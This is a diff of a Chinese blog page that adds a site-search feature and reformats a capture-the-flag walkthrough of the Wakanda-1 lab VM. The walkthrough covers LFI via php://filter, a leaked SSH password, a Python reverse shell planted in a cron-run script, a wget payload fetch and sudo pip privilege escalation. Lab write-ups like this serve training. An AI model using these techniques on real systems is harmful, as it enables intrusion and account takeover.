@@ -251,9 +251,41 @@
       
 
       
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
     </ul>
   
 
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
   
 </nav>
 
@@ -397,22 +429,22 @@
       
 
       
-        <h1 id="Wakanda-1-过程总结"><a href="#Wakanda-1-过程总结" class="headerlink" title="Wakanda-1 过程总结"></a>Wakanda-1 过程总结</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">查看本机<span class="built_in">IP</span>：    <span class="built_in">ip</span> a</span><br><span class="line"></span><br><span class="line">目标<span class="built_in">IP</span>：    arp-scan -l</span><br><span class="line">全端口扫描：    nmap -sV -p- <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span></span><br><span class="line">网站目录枚举：  dirb http://<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span></span><br><span class="line">网站漏洞扫描：  nikto -h http://<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span>/</span><br><span class="line">在网站目录 cd /var/www/html/ </span><br><span class="line"></span><br><span class="line">LFI：   curl http://<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span>/?lang=php://filter/convert.base64-encode/resource=index</span><br><span class="line"></span><br><span class="line">远程连接：ssh mamadou@<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span> -p <span class="number">3333</span></span><br><span class="line">查看用户权限：  sudo -l</span><br><span class="line">python提示符界面：</span><br><span class="line">&gt;&gt;&gt;import pty</span><br><span class="line">&gt;&gt;&gt;pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line"></span><br><span class="line">nc监听: nc -lvvp <span class="number">5555</span></span><br><span class="line">建立简单的服务器：  python -m SimpleHTTPServer <span class="number">8888</span></span><br><span class="line">查看用户文件：  find / -user devops <span class="number">2</span>&gt;/dev/null</span><br><span class="line">目的机新建文件：  mkdir fakepip 执行pip漏洞-&gt;cd fakepip</span><br><span class="line">从本地机下载：  wget http://<span class="number">192.168</span><span class="meta">.0</span><span class="meta">.104</span>:<span class="number">8888</span>/setup.py</span><br><span class="line">目的机下载set.up执行fakepip：   sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure>
+        <h1 id="Wakanda-1-过程总结"><a href="#Wakanda-1-过程总结" class="headerlink" title="Wakanda-1 过程总结"></a>Wakanda-1 过程总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">查看本机IP：    ip a</span><br><span class="line"></span><br><span class="line">目标IP：    arp-scan -l</span><br><span class="line">全端口扫描：    nmap -sV -p- 192.168.56.101</span><br><span class="line">网站目录枚举：  dirb http://192.168.56.101</span><br><span class="line">网站漏洞扫描：  nikto -h http://192.168.56.101/</span><br><span class="line">在网站目录 cd /var/www/html/ </span><br><span class="line"></span><br><span class="line">LFI：   curl http://192.168.56.101/?lang=php://filter/convert.base64-encode/resource=index</span><br><span class="line"></span><br><span class="line">远程连接：ssh mamadou@192.168.56.101 -p 3333</span><br><span class="line">查看用户权限：  sudo -l</span><br><span class="line">python提示符界面：</span><br><span class="line">&gt;&gt;&gt;import pty</span><br><span class="line">&gt;&gt;&gt;pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line"></span><br><span class="line">nc监听: nc -lvvp 5555</span><br><span class="line">建立简单的服务器：  python -m SimpleHTTPServer 8888</span><br><span class="line">查看用户文件：  find / -user devops 2&gt;/dev/null</span><br><span class="line">目的机新建文件：  mkdir fakepip 执行pip漏洞-&gt;cd fakepip</span><br><span class="line">从本地机下载：  wget http://192.168.0.104:8888/setup.py</span><br><span class="line">目的机下载set.up执行fakepip：   sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure>
 
 <h1 id="Wakanda-1"><a href="#Wakanda-1" class="headerlink" title="Wakanda-1"></a>Wakanda-1</h1><h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>查看本机ip ，使用命令 ip a<br><img src="https://i.loli.net/2019/10/17/QJ7rlCpbEwfmoWO.png" alt="9_NO8_QA_M3S_LJ5N3~@MB0.png"><br>查找目标ip，使用命令arp-scan -l<br><img src="https://i.loli.net/2019/10/17/vsfaqpJBGHQClwW.png" alt="1_Q_KQN_8_I_9X___WJL1_R.png"><br>如图可知，目标ip为：192.168.56.101</p>
 <h2 id="搜索信息"><a href="#搜索信息" class="headerlink" title="搜索信息"></a>搜索信息</h2><p>端口扫描：nmap -sV -p- 192.168.56.101<br><img src="https://i.loli.net/2019/10/17/uPg2FhVxnCKTaJ1.png" alt="CNJVOQV@DKZI@55W2_K@GQ4.png"><br>可知，80端口上开放一个WEB程序，3333端口运行SSH服务</p>
 <p>目录枚举：dirb <a href="http://192.168.56.101" target="_blank" rel="noopener">http://192.168.56.101</a><br><img src="https://i.loli.net/2019/10/17/nUMd8V1D7v5Q4GW.png" alt="8_~K5L_2B_LZ@T_N0D_Z387.png"></p>
 <p>扫描漏洞：nikto -h <a href="http://192.168.56.101/" target="_blank" rel="noopener">http://192.168.56.101/</a><br><img src="https://i.loli.net/2019/10/17/iDIZ7NKy3CqPEGT.png" alt="_9_R~_~____KAVIYV`SCWKL.png"></p>
 <p>访问网页：<br><img src="https://i.loli.net/2019/10/17/O9RYGtojeM5H82c.png" alt="_Q_2___B___G1O__3HXJWQ8.png"><br>查看源码：<br><img src="https://i.loli.net/2019/10/17/TdChGqiOuKnfz53.png" alt="5_NE_0J1P8XITYZ7C89KXCK.png"><br>在注释中发现?lang=fr,在URL中添加此参数，发现网站切换语言为法语<br><img src="https://i.loli.net/2019/10/17/OClaAiFw39h5RLG.png" alt="_@TX3IM_MHQ900``CTY_VNX.png"><br>可能存在LFI（本地文件包含）或者RDL（远程文件包含）漏洞<br>可尝试一波LFI，借助curl工具，使用php filter伪协议来读取index文件源码<br>使用命令：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.101</span><span class="regexp">/?lang=php:/</span><span class="regexp">/filter/</span>convert.base64-encode<span class="regexp">/resource=index</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.101/?lang=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/10/17/ptg1xcj6UN4PKH3.png" alt="37IQAJP3SW__Q6ZJSPGMRGM.png"><br>将读取的内容进行base64解码<br><img src="https://i.loli.net/2019/10/17/sKX9BlkgHY72Uuz.png" alt="_BE8NTD_7Y__01QIS@567IU.png"><br>得到password=’Niamey4Ever227!!!’  看到author为：mamadou<br>远程连接：ssh <a href="mailto:mamadou@192.168.56.101" target="_blank" rel="noopener">mamadou@192.168.56.101</a> -p 3333<br><img src="https://i.loli.net/2019/10/17/RGukMaBS42fL3es.png" alt="@R9H__W_B5F88_6N47M_9_P.png"><br>登陆成功后，得到一个python命令提示符界面，使用</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt;import pty</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;pty.spawn(<span class="string">"/bin/bash"</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;import pty</span><br><span class="line">&gt;&gt;&gt;pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>
 
 <p>进入系统的bash shell中，发现flag1<br><img src="https://i.loli.net/2019/10/17/6T7y3wQpZabHzqM.png" alt="FIBA11@K9G_U_PQ56L_XEV4.png"><br>在网站目录 使用命令：cd /var/www/html/ 下，也未找到有用的信息<br>查看当先mamadou用户是否有sudo权限<br><img src="https://i.loli.net/2019/10/17/9Z3klDbgqciOBvu.png" alt="E_U_J_374G_A_@7O7PV_29N.png"><br>查看是否还有其他用户：cat /etc/passwd<br><img src="https://i.loli.net/2019/10/17/XkBuljZdvH2rPCn.png" alt="MPZE@5WJ2X_JSISOG_R1ZTD.png"></p>
 <p>查看devops用户，发现有flag2，但mamadou没有查看权限，查看一个特殊的py文件<br>使用命令：find / -user devops 2&gt;/dev/null<br><img src="https://i.loli.net/2019/10/17/adAvzEMLpYq3XGh.png" alt="_SPI_0_Z6N__TIQ_5_`L97A.png"><br>查看/tmp目录，发现一个test文件，是devops用户的，而且更新时间比较短，可知是一个定期运行的文件<br><img src="https://i.loli.net/2019/10/17/JLQU6xXjuo7iycW.png" alt="_BIIL_TAPH_ABOTXLP09XZD.png"></p>
 <h2 id="使用反弹shell"><a href="#使用反弹shell" class="headerlink" title="使用反弹shell"></a>使用反弹shell</h2><p>修改.antivirus.py</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">socket</span>,subprocess,os</span><br><span class="line"></span><br><span class="line">s=<span class="built_in">socket</span>.<span class="built_in">socket</span>(<span class="built_in">socket</span>.AF_INET,<span class="built_in">socket</span>.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.56.101"</span>,<span class="number">5555</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/bash"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.56.101&quot;,5555))</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/10/17/gGLoTEDudeJYklh.png" alt="_RY3RP_ZQYU87_`3IUAN@M6.png"></p>
 <p>然后本地监听，等待脚本被执行<br>使用命令 nc -lvvp 5555<br><img src="https://i.loli.net/2019/10/17/15DA7I4OTXMwkYe.png" alt="UN_D8@ZM8`J_AOZJXXFMF~T.png"></p>
@@ -824,6 +856,323 @@
 
 
   
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
 
 
 
